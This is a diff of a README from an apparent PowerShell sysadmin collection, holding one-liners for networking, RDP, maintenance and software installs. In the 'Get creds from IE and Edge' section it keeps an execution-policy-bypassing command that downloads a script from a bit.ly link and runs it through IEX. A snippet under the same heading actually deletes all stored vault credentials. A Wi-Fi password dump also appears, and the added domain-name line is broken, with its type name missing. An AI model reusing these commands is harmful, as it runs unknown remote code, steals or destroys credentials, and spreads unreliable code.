@@ -1,21 +1,29 @@
 # Powershell-SysAdmin
 SysAdmin stuff using the all powerful powershell. Commands that are hopefully helpful when administering a Windows environment. 
 
-## One-Liners
-
-#### Get Domain Name
-```$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name```
-
-#### Find Domain Controller using DNS
-```Resolve-DnsName -Name "_ldap._tcp.dc._msdcs.$domainName" -QueryType SRV```
-
-###
+* [Practice](https://github.com/superswan/Powershell-SysAdmin/edit/master/README.md#practice)
+* [One-Liners](https://github.com/superswan/Powershell-SysAdmin/edit/master/README.md#one-liners)
+* [Snippets](https://github.com/superswan/Powershell-SysAdmin/edit/master/README.md#snippets)
+* [Scripts](https://github.com/superswan/Powershell-SysAdmin/edit/master/README.md#scripts)
+* [Windows Defender](https://github.com/superswan/Powershell-SysAdmin/edit/master/README.md#windows-defender)
+* [Fun](https://github.com/superswan/Powershell-SysAdmin/edit/master/README.md#fun)
 
 #### Install Winget 
 ```
-Invoke-WebRequest -Uri "https://github.com/microsoft/winget-cli/releases/download/v1.1.12653/Microsoft.DesktopAppInstaller_8wekyb3d8bbwe.msixbundle" -OutFile "C:\WinGet.msixbundle"
+Invoke-WebRequest -Uri "https://github.com/microsoft/winget-cli/releases/download/v1.6.2771/Microsoft.DesktopAppInstaller_8wekyb3d8bbwe.msixbundle" -OutFile "C:\WinGet.msixbundle"
 Add-AppxPackage "C:\WinGet.msixbundle"
 ```
+
+## Practice
+[Under The Wire](https://underthewire.tech)
+
+## One-Liners
+
+#### Get Domain Name
+```$domain = []::GetCurrentDomain().Name```
+
+#### Find Domain Controller using DNS
+```Resolve-DnsName -Name "_ldap._tcp.dc._msdcs.$domainName" -QueryType SRV```
 
 #### "Pong Command" - Listen for Pings. Uses WinDump.exe
 ```.\WinDump.exe -i 3 icmp and icmp[icmp-echoreply]=icmp-echo```
@@ -33,22 +41,27 @@ Add-AppxPackage "C:\WinGet.msixbundle"
 ```netsh advfirewall firewall add rule name="Allow incoming ping requests IPv4" dir=in action=allow protocol=icmpv4 ```
 
 #### Prefer IPv4 over IPv6
-This adjusts the IPv6 prefix policies so that IPv4 addresses are preferred (Ping, DNS Resolution, etc.)
+This adjusts the IPv6 prefix policies so that IPv4 addresses are preferred (Ping, DNS Resolution, etc.). Run both commands.
 
 ```netsh int ipv6 set prefixpolicy ::ffff:0:0/96 46 4```
 
 ```netsh int ipv6 set prefixpolicy ::/0 45 6```
 
-Run both commands
+#### Reset networking stack
+```netsh int ip reset```
 
-#### Remote Manage
-##### RDP
+```netsh winsock reset```
+
+
+### Remote Manage
+
+#### RDP
 ```reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f```
 
-##### NLA
+#### NLA
 ```Set-ItemProperty ‘HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\‘ -Name “UserAuthentication” -Value 1```
 
-##### Firewall Rule
+#### Firewall Rule
 ```Enable-NetFirewallRule -DisplayGroup “Remote Desktop”```
 
 #### Bloatware Remover
@@ -64,10 +77,10 @@ Run both commands
 ```Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class Keyboard {[DllImport("user32.dll")]public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo);}' ; [Keyboard]::keybd_event(0x11, 0, 0, 0); [Keyboard]::keybd_event(0x10, 0, 0, 0); [Keyboard]::keybd_event(0x5B, 0, 0, 0); [Keyboard]::keybd_event(0x42, 0, 0, 0); [Keyboard]::keybd_event(0x42, 0, 2, 0); [Keyboard]::keybd_event(0x5B, 0, 2, 0); [Keyboard]::keybd_event(0x10, 0, 2, 0); [Keyboard]::keybd_event(0x11, 0, 2, 0);```
 
 
-#### 
-
 #### Get creds from IE and Edge
+
 ```powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/2K75g15’)"```
+
 ```
 [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime] $vault = New-Object Windows.Security.Credentials.PasswordVault $vault.RetrieveAll() | ForEach {$vault.Remove($_)}
 ```
@@ -189,21 +202,9 @@ foreach ($Device in $TouchScreenDevices) {
 }
 ```
 
-## Windows Defender
-[Windows Defender is enough, if you harden it](https://gist.github.com/superswan/1d6ed59e75273f90a481428964be3ae5)
+## Snippets
 
-## Install and configure Windows Subsystem for Linux (Server 2019)
-```
-Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux
-
-curl.exe -L -o debian.appx https://aka.ms/wsl-debian-gnulinux
-Rename-Item .\debian.appx debian.zip
-Expand-Archive .\debian.zip debian
-Expand-Archive .\debian\DistroLauncher-Appx_1.12.1.0_x64.appx
-.\debian\DistroLauncher-Appx_1.12.1.0_x64\debian.exe
-```
-
-## Self-elevate the script if required
+#### Self-elevate script 
 ```
 if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
  if ([int](Get-CimInstance -Class Win32_OperatingSystem | Select-Object -ExpandProperty BuildNumber) -ge 6000) {
@@ -214,8 +215,8 @@ if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 }
 ```
 
-### Do maintenance
-Requires PatchMyPC
+#### Do maintenance
+**Requires PatchMyPC**
 ```
 # Windows Update
 if ((Get-Module -ListAvailable -Name PSWindowsUpdate) -eq $null)
@@ -240,7 +241,7 @@ sfc /scannow
 cleanmgr.exe /full
 ```
 
-### Dump Wireless Password For All Profiles
+#### Dump Wireless Password For All Profiles
 ```
 $profiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$_.Matches.Groups[1].Value.Trim()}
 
@@ -256,11 +257,30 @@ foreach ($profile in $profiles) {
 }
 ```
 
-## Winget Bulk Install
+#### Winget Bulk Install
 https://winstall.app 
 ```
 winget install --id=Microsoft.DotNet.Framework.DeveloperPack_4 -e  ; winget install --id=Google.Chrome -e  ; winget install --id=Microsoft.VCRedist.2013.x64 -e  ; winget install --id=Microsoft.VCRedist.2013.x86 -e  ; winget install --id=Microsoft.VCRedist.2015+.x64 -e  ; winget install --id=Microsoft.VCRedist.2015+.x86 -e  ; winget install --id=Microsoft.VCRedist.2012.x64 -e  ; winget install --id=Microsoft.VCRedist.2012.x86 -e  ; winget install --id=Microsoft.VCRedist.2010.x64 -e  ; winget install --id=Microsoft.VCRedist.2010.x86 -e  ; winget install --id=Microsoft.VCRedist.2005.x86 -e  ; winget install --id=Microsoft.VCRedist.2008.x86 -e  ; winget install --id=Microsoft.VCRedist.2008.x64 -e  ; winget install --id=Oracle.JavaRuntimeEnvironment -e  ; winget install --id=7zip.7zip -e  ; winget install --id=Adobe.Acrobat.Reader.64-bit -e 
 ```
+
+#### Install and configure Windows Subsystem for Linux (Server 2019)
+```
+Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux
+
+curl.exe -L -o debian.appx https://aka.ms/wsl-debian-gnulinux
+Rename-Item .\debian.appx debian.zip
+Expand-Archive .\debian.zip debian
+Expand-Archive .\debian\DistroLauncher-Appx_1.12.1.0_x64.appx
+.\debian\DistroLauncher-Appx_1.12.1.0_x64\debian.exe
+```
+
+## Scripts
+
+* HP Bloatware Removal
+* AD Audit
+
+## Windows Defender
+[Windows Defender is enough, if you harden it](https://gist.github.com/superswan/1d6ed59e75273f90a481428964be3ae5)
 
 ## Fun
 #### Final Fantasy Victory Beep
